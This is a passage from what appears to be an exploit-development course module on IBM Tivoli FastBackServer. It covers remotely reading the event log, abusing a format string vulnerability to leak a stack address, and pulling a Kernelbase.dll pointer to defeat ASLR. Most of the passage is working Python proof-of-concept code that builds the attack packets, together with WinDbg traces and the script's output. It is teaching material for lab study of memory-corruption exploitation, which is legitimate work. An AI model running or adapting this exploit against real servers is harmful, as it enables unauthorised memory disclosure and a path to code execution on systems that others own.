2 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7
11.3.5. Return the Log Content
Now that we've found a code path that allows us to read from the event log, we need to learn how to return that data to our Kali machine. Given that an opcode triggers a read from the event log, it stands to reason that the result should be passed somewhere, otherwise it is not of much use.
In the previous module, we found that FXCLI_OraBR_Exec_Command contains functionality to return data through TCP packets. We need to ensure that our event log data follows the same path.
After reading the contents from the event log file, a short epilogue is executed, after which we can exit SFILE_ReadBlock and return back into FXCLI_OraBR_Exec_Command.
 
Figure 34: Return value check
After returning from SFILE_ReadBlock, we find a null value check on the function return value.
Let's quickly check this value in WinDbg by continuing execution until the function returns and stepping out of it:
0:001> pt
eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360
eip=00499f19 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!SFILE_ReadBlock+0x211:
00499f19 c3              ret

0:001> p
eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360
eip=00570f08 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x4a52:
00570f08 83c410          add     esp,10h
Listing 71 - Return value of SFILE_ReadBlock is number of bytes read
As highlighted in Listing 71, the return value of SFILE_ReadBlock is the number of bytes read from the log file.
This means we will trigger the JNZ and, after another jump, reach the basic block shown in Figure 35.
 
Figure 35: Code path that leads to data return
As we'll recall from a previous module, this is the starting branch that enables our data to be returned to us. We seem to be on the right track.
When we trace execution, we will find ourselves following the same path through the checks until we reach FXCLI_IF_Buffer_Send, as shown in Figure 36.
 
Figure 36: Arguments for FXCLI_IF_Buffer_Send
To check the arguments, we can single step in WinDbg to the call into FXCLI_IF_Buffer_Send and dump them:
eax=018943a8 ebx=060fae50 ecx=04f91020 edx=00020000 esi=060fae50 edi=00669360
eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x9877:
00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3)

0:001> dds esp L4
0db5e324  018943a8
0db5e328  00020000
0db5e32c  04f91020
0db5e330  00000001

0:001> da 018943a8
018943a8  "  .[Apr 22 00:10:04:998](15b4)->"
018943c8  "I4.GENERAL  .:.|tOA             "
018943e8  "              |     0|200000|199"
01894408  "000|199000|      0|   17496|    "
01894428  "0.00|    0.17|PRIORITY|         "
...
Listing 72 - Arguments for FXCLI_IF_Buffer_Send
The first argument does indeed contain the event log entry content that was read. The second argument, highlighted in Listing 72, is also the size of the data that was read.
Next, let's update our Python code to receive a response from the socket. This small change is highlighted in Listing 73.
...
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))

s.send(buf)
response = s.recv(1024)
print(response)

s.close()
...
Listing 73 - Add a recv call to our code
To run our new proof of concept, we can remove all breakpoints in WinDbg and let execution continue.
kali@kali:~$ python3 poc.py 192.168.120.10
b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA                           |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                                                                                                           \n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|                                                                                                           \n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|tFXC                          |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                                                                                                           \n[Apr 22 00:10:05:029](15b4)->I4.GENERAL  \t:\t|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|                                                                                                     '
[+] Packet sent
Listing 74 - Obtaining event log data
We have received the event log data. This is a great success!
Note that the request may fail to return data and multiple executions of the poc may be required.
This section concludes our initial work understanding how to remotely trigger a read from the event log. To make use of this in our exploit, we have to address several challenges, including determining the Start and Length values needed to read specific event log entries.
We will also need to learn how to parse the data that is returned to us so it can be used programmatically in our exploit.
Exercises
1.	Repeat the analysis on how to read event log data remotely.
2.	Update your proof of concept to obtain event log data remotely.
11.4. Bypassing ASLR with Format Strings
We have now discovered a format string vulnerability that allows us to disclose a stack address and have it written to the custom event log. We have also learned how to read from the event log.
In the next three sections, we will combine these findings to first return the stack address, and then obtain the memory address of a DLL, which will allow us to bypass ASLR.
11.4.1. Parsing the Event Log
Before we can leak the stack address from the event log, we need to learn how to read from a specific portion of it. In this section, we will dive into the way the Start and Length values determine what output is returned.
From our reverse engineering, we know that the Length value determines the amount of data read. We also know that the value we supply is left-shifted by 8 bits, which equates to multiplying it by 0x100.
What we don't know yet is the maximum allowed value. To figure this out, let's examine the response we got from the returned event log content. Specifically, we'll review the first line, as given in Listing 75.
kali@kali:~$ python3 poc.py 192.168.120.10
b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA 
...
Listing 75 - The initial response from reading the event log
As highlighted in the output, the first four bytes are a byte array containing the Length value, left-shifted by 8 bits. This means that when the content is returned to us, we'll also get its size as the first four bytes.
To take advantage of this, we will only receive the first four bytes of the reply and convert that to an integer. We can then perform multiple requests with an increasing Length value and check the corresponding reply for errors.
The code for this can be adapted from the previous proof of concept by moving the packet creation, transmission, and reception into a for loop.
We also want to limit the reply from the server to just four bytes. These four bytes are then converted to an integer and printed along with the original Length value.
if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460
	
	for l in range(0x100):
		# psAgentCommand
		buf = pack(">i", 0x400)
		buf += bytearray([0x41]*0xC)
		buf += pack("<i", 0x520)  # opcode
		buf += pack("<i", 0x0)    # 1st memcpy: offset
		buf += pack("<i", 0x100)  # 1st memcpy: size field
		buf += pack("<i", 0x100)  # 2nd memcpy: offset
		buf += pack("<i", 0x100)  # 2nd memcpy: size field
		buf += pack("<i", 0x200)  # 3rd memcpy: offset
		buf += pack("<i", 0x100)  # 3rd memcpy: size field
		buf += bytearray([0x41]*0x8)

		# psCommandBuffer
		buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x100 * (l+1))  
		buf += b"B" * 0x100 
		buf += b"C" * 0x100 

		# Padding
		buf += bytearray([0x41]*(0x404-len(buf)))

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((server, port))
		
		s.send(buf)
		response = s.recv(4)
		size = int(response.hex(),16)

		print("Length value is: " + str(hex(0x100 * (l+1))) + " The size returned is: " + str(hex(size)))

		s.close()

	sys.exit(0)
Listing 76 - Loop to test values of Length
Let's execute the proof of concept and check the Length value against the corresponding return size, as shown in Listing 77.
kali@kali:~$ python3 poc.py 192.168.120.10
Length value is: 0x100 The size returned is: 0x10000
Length value is: 0x200 The size returned is: 0x20000
Length value is: 0x300 The size returned is: 0x30000
Length value is: 0x400 The size returned is: 0x40000
Length value is: 0x500 The size returned is: 0x50000
Length value is: 0x600 The size returned is: 0x60000
Length value is: 0x700 The size returned is: 0x70000
Length value is: 0x800 The size returned is: 0x80000
Length value is: 0x900 The size returned is: 0x90000
Length value is: 0xa00 The size returned is: 0xa0000
Length value is: 0xb00 The size returned is: 0xb0000
Length value is: 0xc00 The size returned is: 0xc0000
Length value is: 0xd00 The size returned is: 0xd0000
Length value is: 0xe00 The size returned is: 0xe0000
Length value is: 0xf00 The size returned is: 0xf0000
Length value is: 0x1000 The size returned is: 0x100000
Length value is: 0x1100 The size returned is: 0x1
Length value is: 0x1200 The size returned is: 0x1
Length value is: 0x1300 The size returned is: 0x1
Length value is: 0x1400 The size returned is: 0x1
...
Listing 77 - Result of Length enumeration
The output reveals that a Length value larger than 0x1000 results in an error. With the value 0x1000, we can read as much of the log entry as possible at once.
We should note that after running the testing code and obtaining the error, we have to restart the FastBackServer service to obtain usable results again.
Now that we know the optimal value for Length, let's turn to the Start value.
We already have most of the required knowledge from our work earlier. The Start value chooses both which log file to read from and the offset into the chosen log file.
While we were able to determine and hardcode the best value for Length, the Start value must be found dynamically when we execute the exploit.
Let's keep in mind that new log entries are added at the end of the log file with the suffix 040. When we leak the stack pointer and subsequently read from the event log, we expect the stack pointer leak to be among the newest entries.
Knowing all of this, we still can't find a specific Start value. Instead, we need to choose one in such a way that a read operation will reach the end of the newest log file.
The size of the content read from the event log is returned to us in the first four bytes of the TCP packet. This means we can perform a loop by beginning with a Start value of 0, and then use the size to determine if we reached the end of the log.
If the returned data size is 0x100000, we will need to increase the Start value and try again. By increasing the Start value, we will eventually reach the end of the log file. At that point, less data than 0x100000 will be read, and the returned size is expected to be less than 0x100000.
We can test this by once again adapting our initial event log read code, as given in Listing 78.
server = sys.argv[1]
port = 11460

startValue = 0

while True:

  # psAgentCommand
	buf = pack(">i", 0x400)
	buf += bytearray([0x41]*0xC)
	buf += pack("<i", 0x520)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x100)  # 1st memcpy: size field
	buf += pack("<i", 0x100)  # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x200)  # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)

	# psCommandBuffer
	buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)  
	buf += b"B" * 0x100 
	buf += b"C" * 0x100 

	# Padding
	buf += bytearray([0x41]*(0x404-len(buf)))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))
		
	s.send(buf)
	response = s.recv(4)
	size = int(response.hex(),16)

	print("Start value of " + str(hex(startValue)) + " Yields a data size of: " + str(hex(size)))
	startValue += 0x1000
	s.close()
		
sys.exit(0)
Listing 78 - Code to enumerate Start values
We can perform a read from the event log with the given Start value and print out the returned data length. The increase in the size of Start by 0x1000 is arbitrary, but we will find it to be appropriate.
When the proof of concept is executed, we will check the Start value against the associated data size.
kali@kali:~$ python3 poc.py 192.168.120.10
Start value of 0x0 Yields a data size of: 0x100000
Start value of 0x1000 Yields a data size of: 0x100000
Start value of 0x2000 Yields a data size of: 0x100000
...
Start value of 0x60000 Yields a data size of: 0x100000
Start value of 0x61000 Yields a data size of: 0x100000
Start value of 0x62000 Yields a data size of: 0xe3603
Start value of 0x63000 Yields a data size of: 0x1
Start value of 0x64000 Yields a data size of: 0x1
Start value of 0x65000 Yields a data size of: 0x1
Listing 79 - Enumerating Start values
As highlighted in Listing 79, the output offers three data size options:
1.	0x10000, meaning we have not found the end of the log yet.
2.	Between 0x1 and 0x10000, meaning we have found the end of the log.
3.	0x1, meaning the Start value is too large.
We'll remember that after running the testing code and obtaining the error, we have to restart FastBackServer for the data size return value to be correct.
If the Tivoli installation has been running for a long time, the event log may have grown so large that initial requests will also return a value of 0x1.
We could simply pick the first Start value that results in a data size between 0x1 and 0x100000, but that might lead to some issues.
Our selection of the Start value happens before the stack leak is performed. This means that additional data will be written to the event log before we use the Start value to read the stack address.
Figure 37 illustrates how the distance from the Start value to the end of the log file must be less than 0x100000 both before and after the stack leak.
 
Figure 37: Read before and after stack address leak
If we select a Start value where the returned size is close to 0x100000, data written to the event log between our enumeration and the read of the leak could put the stack address outside that range.
Likewise, if the result returned is 0x1 due to the Start value being too large, we will encounter issues with the read method in subsequent calls.
We can address this issue by using the returned data size to calculate the optimal Start value. We'll recall that the Length value is left-shifted by 8 bits before being used, which means the data size returned can be right-shifted and added to the Start value.
Our calculations will result in a Start value that points right to the end of the log file before the stack leak is triggered. It is very likely that another read from the event log will contain the leaked stack address.
Listing 80 shows the required code modifications for our calculations.
while True:
	...
	s.send(buf)
	response = s.recv(4)
	size = int(response.hex(),16)
	print("Start value of: " + str(hex(startValue)) + " yields a data size of: " + str(hex(size)))
	if size < 0x100000:
		size = size >> 8
		startValue += size
		break
	startValue += 0x1000
	s.close()
	
print("The optimal start value is: " + str(hex(startValue)))
Listing 80 - Improved code to enumerate Start values
Listing 81 shows the updated code in action.
kali@kali:~$ python3 poc.py 192.168.120.10
...
Start value of: 0x5f000 yields a data size of: 0x100000
Start value of: 0x60000 yields a data size of: 0x100000
Start value of: 0x61000 yields a data size of: 0x100000
Start value of: 0x62000 yields a data size of: 0x9b103
The optimal start value is: 0x629b1
Listing 81 - Located optimal Start value
We have now succeeded in dynamically locating the optimal Start value. This will allow us to read newly-added content to the event log.
We'll note that when FastBackServer has been installed and running for a while, large Start values are common. We can speed up the exploit for development purposes by starting at a high initial value instead of 0.
In this section, we learned how to select both the Length and the Start values so that we will be able to read the formatted string containing the stack address from the event log.
Exercises
1.	Repeat the analysis and locate the optimal Length and Start values.
2.	Rewrite the code for locating the optimal Start value into a function.
11.4.2. Leak Stack Address Remotely
Finally, we have analyzed all the required pieces to perform a remote stack address leak. In this section, we will combine the format string vulnerability with the ability to read from the event log to obtain the stack address on our Kali machine.
Earlier in this module, we located the event log entry containing the stack address leak. This is repeated in Listing 82.
PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1
[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696620746120646e746e65672578252025782578257825782578257825782578257825782578257825
Listing 82 - Formatted string as an event entry
Even with our ability to read from the log file, we cannot easily pinpoint this specific entry nor the stack address itself.
We can locate it easily if we modify the format string to contain a unique header, and then search through the event log data for it.
The formatted string also contains multiple values and we must identify the correct value representing the stack address. We can address this by inserting a symbol between each format specifier.
Listing 83 shows the modified psCommandBuffer of the previous Python script invoking the EventLog function.
# psCommandBuffer
buf += b"w00t:" + b"%x:" * 0x80  
buf += b"B" * 0x100 
buf += b"C" * 0x100 
Listing 83 - Unique value is inserted in format string
The first part of the psCommandBuffer has been prepended with the unique header value "w00t", as well as a colon between each format string specifier.
After updating the format string vulnerability code, let's examine how this helps us read the content written to the event log.
Since the event log is written to frequently, we'll set a breakpoint in WinDbg on the call to AGI_S_GetAgentSignature (Listing 84). This will pause all other writes to the event log by the application.
Once the breakpoint is hit, we can step over the call and find the stack address is written to the event log:
0:078> bp FastBackServer!AGI_S_GetAgentSignature+0xd8

0:078> g
Breakpoint 0 hit
eax=0d993b30 ebx=0621b758 ecx=021df978 edx=00976a78 esi=0621b758 edi=00669360
eip=0054b69b esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
FastBackServer!AGI_S_GetAgentSignature+0xd8:
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)

0:007> p
eax=00000001 ebx=0621b758 ecx=0d93d184 edx=76fc1670 esi=0621b758 edi=00669360
eip=0054b6a0 esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
FastBackServer!AGI_S_GetAgentSignature+0xdd:
0054b6a0 83c410          add     esp,10h
Listing 84 - Breakpoint on call to EventLog
Since WinDbg has paused FastBackServer, no additional writes are performed.
With the entry written, let's dump the newest entries from the event log with PowerShell.
PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 2
[May 03 16:01:49:475](174c)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent w00t:c4:d93ded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825
[May 03 16:01:49:475](174c)-->W8.AGI            :       ..:c4:d93df96:3a:25:6c:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:25
Listing 85 - Dumping the newest events from the event log
The content of the event log shows that our "w00t" is prepended to the format specifiers, and each value inserted by the format specifiers is separated by colons.
We'll also note that the leaked stack address is the second value after the "w00t" header. This modification will allow us to parse the retrieved data in Python by searching for the line that starts with "w00t", split that line on colons, and select the second value.
At this point, we need to combine the code for triggering the format string vulnerability with the code for locating the optimal Start value, as well as implement code to read the newest entries.
First, let's find the Start value. We can do this by implementing the previous while loop inside a function (findStartValue) to make the code easier to manage. After locating the optimal Start value, we'll insert the code to trigger the format string vulnerability.
Finally, we need to read the contents of the event log, so let's review some aspects of how TCP traffic works.
TCP guarantees that all the network data is delivered, and delivered in the right order. It does not, however, specify how many network packets are used to transmit the data, or whether they will be of equal size.
To ensure we receive all the event log data, we must detect when there is none left. Luckily, this is easy since FastBackServer returns the total data size in the first 4 bytes.
Listing 86 shows the code related to detecting when all data has been received. We'll need to keep in mind that the code to locate the Start value triggering the format string vulnerability, as well as reading from the event log, is also required.
...
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.send(buf)

responseSize = s.recv(4)
size = int(responseSize.hex(),16)
print("The eventlog returned contains %x bytes" % size)

aSize = 0
eventData = b""
while True:
	tmp = s.recv(size - aSize)
	aSize += len(tmp)
	eventData += tmp
	if aSize == size:
		break
s.close()
print("The size read is: " + str(hex(aSize)))
print(eventData)
...
Listing 86 - Python code to receive the event log
We can implement the while loop shown in Listing 86 to first get the size of the total reply and keep reading from the socket until we have received that amount of data, aggregating the size in aSize and data in eventData.
To track the progress of our code, we can print the size of the event log data we expect to receive. After we are done receiving data, we will print the aggregated amount along with the event log data itself.
Execution of the updated proof of concept is shown in Listing 87.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x7cc1a
Stack address is written to event log
The eventlog returned contains da03 bytes
The size read is: 0xda03
b"  \n[May 13 23:07:56:133](14d8)->I4.FX_AGENT 
...
\n[May 13 23:07:56:915](1704)-->W8.AGI      \t:\tAGI_S_GetAgentSignature: couldn't find agent w00t:c4:217dded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a782\n[May 13 23:07:57:039](14d8)->I4.FX_AGENT \t:\t3 - Command 0x0\ttime=0
...
Listing 87 - Reading the eventlog containing the stack address
The output has been truncated to only show the relevant event log data.
The highlighted portion of the output given in the listing above shows the presence of the unique header and a stack address in the data we received.
Next, we'll use the header value to dynamically locate the stack address in the event log data.
The required parsing code is given in Listing 88.
data = eventData.split(b"w00t:")
values = data[1].split(b":")
stackAddr = int(values[1],16)
print("Leaked stack address is: " + str(hex(stackAddr)))
Listing 88 - Code to parse the event log
First, we'll use the split1 function by supplying the string "w00t:" and breaking up the entire event log into two byte arrays (data).
In the second index of the array (data[1]), we find the stack address. It comes after the static "c4:" value, meaning we can perform another split on the ":" delimiter and the stack address will be in the second entry (with an index of 1).
Once the stack address is located, it is converted into an integer and printed to the console.
Listing 89 shows the entire exploit code in action.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x666ea
Stack address is written to event log
The eventlog returned contains 6b03 bytes
The size read is: 0x6b03
Leaked stack address is: 0x237dded4
Listing 89 - Locate stack address remotely
We have remotely triggered the format string vulnerability and retrieved the stack address. Excellent!
Exercises
1.	Follow the analysis and use a unique header to locate the correct log entry.
2.	Combine the previous proofs of concept to obtain one script that remotely leaks the stack address.
3.	Is the stack address static across multiple executions of the exploit?
1 (tutorialspoint, 2020), https://www.tutorialspoint.com/python3/string_split.htm
11.4.3. Saving the Stack
In the previous section, we managed to remotely trigger a format string specifier attack that writes a stack address to the event log. We were then able to request and parse the relevant portion of the event log to obtain it.
If we run the exploit multiple times without restarting the FastBackServer service, we'll notice that the stack address changes every time.
This is common for applications that handle multiple simultaneous connections by creating a new thread for each connection.
In these types of applications, when the socket is closed, the thread is terminated. The stack address we leaked is no longer valid since each thread has a separate stack. To make use of the stack address, we must ensure that the thread is not terminated before our exploit completes.
We can avoid the stack address changing by using the same socket session to both trigger the stack leak and the event log read.
When we determined the optimal Start value earlier, we could leverage multiple socket connections because we had not yet leaked the stack address.
We must create the socket and perform the connection once, but this introduces an issue to solve. When we send the packet with the format string specifiers that trigger the stack leak, data is also returned to us.
This didn't matter to us previously because we don't need that data and the socket was simply closed, thus flushing any data from the connection. When we operate within the same connection, however, we must always read all available data before sending a new packet.
Listing 90 shows the code needed to receive the reply.
s.send(buf)

responseSize = s.recv(4)
size = int(responseSize.hex(),16)

aSize = 0
while True:
	tmp = s.recv(size - aSize)
	aSize += len(tmp)
	if aSize == size:
		break	

print("Stack address is written to event log")
Listing 90 - Receive all data sent as a reply
The code is almost identical to that used to receive the event log data, except that we do not keep an aggregate of data.
Next, we'll run the exploit as shown in Listing 91.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x673f0
Stack address is written to event log
The eventlog returned contains 5d03 bytes
The size read is: 0x5d03
Leaked stack address is: 0x27bdded4
Listing 91 - The updated code leaks the stack from the same connection session
We obtain the same type of output as earlier, including the leak of the stack address.
While the change introduced in this section seems negligible, it will be very important in the next section, when we take the stack leak one step forward and bypass ASLR.
Exercises
1.	Update the proof of concept to use only a single connection when performing the stack leak and event log read.
2.	Is it possible to perform all actions in the exploit from a single connection and, if so, does it increase the efficiency?
11.4.4. Bypassing ASLR
Achieving a remote leak of a stack address is interesting, but it does not directly allow us to bypass ASLR and in such a way that we can build a ROP chain. We must leak an address inside either a Tivoli module or a native DLL.
In this section, we will build upon the stack leak and reuse the format string specifier vulnerability to obtain the base address of Kernelbase.dll.
First, we need to understand how the leaked stack address can provide us with an address inside Kernelbase.dll, and then we will work to obtain it.
When we made a connection in the previous section, a new thread was created to handle the packets. It is a stack address from this new thread that was leaked back to us. If we pause Python execution after leaking the stack address, but before closing the connection to FastBackServer, we can inspect the contents at that stack address in WinDbg.
To pause execution of our Python script, we'll use the input1 function to wait for console input before we call the close method on the socket.
stackAddr = int(values[1],16)
print("Leaked stack address is: " + str(hex(stackAddr)))
input();
s.close()
sys.exit(0)
Listing 92 - Pause Python execution with input
We'll note that the call to close the connection is moved to just before the script terminates.
When the script executes, we obtain the stack address and execution waits for our console input, as shown in Listing 93.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61ca1
Stack address is written to event log
The eventlog returned contains 1203 bytes
The size read is: 0x1203
Leaked stack address is: 0x1035ded4
Listing 93 - Execution is paused after leaking the stack address
Now we can attach WinDbg to FastBackServer and inspect the contents at the leaked stack address.
The stack often contains pointers to various DLLs that we could use to bypass ASLR. To locate consistent addresses, let's start by inspecting data close to the currently leaked address across multiple reruns of both the exploit and the service.
Listing 94 shows the stack content at lower addresses than the leaked one. Trial and error reveals that pointers located at higher addresses are not stable across multiple packet transmissions.
0:063> dds 1035ded4-200*4 L200
1035d6d4  00000000
1035d6d8  00000000
...
1035dd68  00000320
1035dd6c  00000001
1035dd70  7720f11f ntdll!RtlDeactivateActivationContextUnsafeFast+0x9f
1035dd74  1035dde0
1035dd78  745dc36a KERNELBASE!WaitForSingleObjectEx+0x13a
1035dd7c  745dc2f9 KERNELBASE!WaitForSingleObjectEx+0xc9
1035dd80  00669360 FastBackServer!_beginthreadex+0x6b
1035dd84  7720e323 ntdll!RtlActivateActivationContextUnsafeFast+0x73
...
Listing 94 - Kernelbase pointers on the stack
The output in the listing above is greatly truncated due to the amount of data.
We'll find numerous pointers to Kernelbase.dll, ntdll.dll, and FastBackServer.exe on the stack. At first glance, any of those pointers could be used, but there are some considerations to take into account.
Addresses in FastBackServer.exe contain null bytes, so these are not a good candidate for generating a ROP chain.
To execute shellcode, we must invoke an API like VirtualProtect or VirtualAlloc, but ntdll.dll only contains low level versions of these that take more complicated arguments.
To preserve stability, we should choose a pointer inside Kernelbase.dll that is a decent amount of bytes lower than the leaked address. This ensures that the same pointer is present at the same location on multiple reruns of the exploit and across an arbitrary amount of transmitted packets.
Through trial and error, we'll discover the address KERNELBASE!WaitForSingleObjectEx+0x13a, highlighted in Listing 94, remains stable at the same stack offset. We'll use this during the remainder of this module.
Next, we need to calculate the offset from the leaked stack address to the address containing the pointer.
0:063> ? 1035ded4-1035dd78
Evaluate expression: 348 = 0000015c
Listing 95 - Offset from leaked stack address to Kernelbase.dll pointer
We find the offset to be the static value 0x15C. We should note that this offset must be subtracted from the leaked stack address.
Since this offset remains constant across multiple reruns of the exploit, we know where an address into Kernelbase.dll is located in memory when the stack address is leaked back to us.
Let's use this knowledge to obtain the pointer remotely. We will reuse our two basic building blocks: the format string specifier vulnerability and our ability to remotely read the event log.
When the "%x" specifier is used, an integer is inserted into the string and interpreted as a hexadecimal value. However, the "%s" specifier interprets the argument as a character array, meaning the argument itself is a memory pointer to a null byte-terminated series of ASCII characters.
The format string function uses the specifier by dereferencing the argument and inserting the contents at that memory location into the processed format string.
If we could put a string specifier into the call to EventLog and make it use the leaked stack address, plus the offset as an argument, it would read out the address inside Kernelbase.dll.
Let's put this theory to the test. We'll start by reviewing how the vulnerable vsnprintf format string function works.
Listing 96 repeats the function prototype of vsnprintf.
int vsnprintf(
  char *s,
  size_t n,
  const char *format,
  va_list arg
);
Listing 96 - Function prototype for vsnprintf
We know that the format string supplied to this function is controlled by us, so we can replace any "%x" with "%s". In the current leak of the stack address, we did not have to do anything, since the stack address was already present, but this time we must also provide the address to leak from.
The arguments for the format string specifier come from the array supplied as the fourth argument (arg). This means if we can somehow influence the contents of this array, the stack address to read from can be inserted within.
Let's execute our current proof of concept and inspect the call to vnsprintf at FastBackServer!EventLog_wrapted+0x2dd. Sadly, we discover it is not productive to set a breakpoint either here or inside the EventLog function due to their common usage.
Instead, we'll set a breakpoint at FastBackServer!AGI_S_GetAgentSignature+0xd8, just like in our initial vulnerability analysis, and then set a breakpoint on FastBackServer!EventLog_wrapted+0x2dd which is only triggered in the same threat context through the keyword ~.2
Once we reach it, we can display the contents of the fourth argument, which is the array used with the format string specifiers:
eax=0000002d ebx=0614aa10 ecx=1079dca5 edx=000001c7 esi=0614aa10 edi=00669360
eip=004803fa esp=1079dc14 ebp=1079dea4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!EventLog_wrapted+0x2dd:
004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133)

0:082> dc poi(esp+c)
1079deb8  000000c4 1079ded4 0000003a 00000025  ......y.:...%...
1079dec8  0000012e 00000078 00000000 5f494741  ....x.......AGI_
1079ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
1079dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
1079def8  6120646e 746e6567 30307720 78253a74  nd agent w00t:%x
1079df08  3a78253a 253a7825 78253a78 3a78253a  :%x:%x:%x:%x:%x:
1079df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
1079df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
Listing 97 - Contents of the array argument to vsnprintf
Interestingly, we'll observe that the unique header "w00t", which we provided along with the format string specifiers themselves, has become part of the arguments.
This means that if we insert a value just after the header, it will be used as an argument for vsnpritnf and become part of the formatted string that is written to the event log.
We notice in Listing 97 that due to alignment of the header, we must add two additional bytes before the values we want to be processed in order for our value to be taken as a separate DWORD.
Let's test this by modifying our proof of concept, as shown in Listing 98.
...
# psCommandBuffer
buf += b"w00t:BBAAAA" + b"%x:" * 0x80  
buf += b"B" * 0x100 
buf += b"C" * 0x100 
...
values = data[1].split(b":")
print(values)
...
Listing 98 - Appending A's after the header
The two B's have been appended to the header to account for alignment explained above, followed by four A's, which we'll invoke through the specifier as a trial.
We have also added a print statement of the event log after it has been split on the ":" delimiter. We can use this to verify our theory without using the debugger.
When the code is executed, we find the four A's, as highlighted in Listing 99.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61fe7
Stack address is written to event log
The eventlog returned contains 1103 bytes
The size read is: 0x1103
[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t', b'\t1 - ...
Leaked stack address is: 0x1029ded4
Listing 99 - Output from appending A's
This proves that we can provide arbitrary null-free input that will be processed by vsnprintf. To trigger a read of its location, we must replace the appropriate "%x" specifier with a "%s".
Counting the number of formatted DWORDs in Listing 99, we find the 41414141 value in the 21st position.
We can now update our proof of concept. First, we'll revert the changes in the initial stack leak packet. We can then make a copy, as shown in Listing 100, to be executed after the stack address is leaked back to us.
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x604)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)
	
# psCommandBuffer
buf += b"w00t:BBAAAA" + b"%x:" * 20
buf += b"%s"
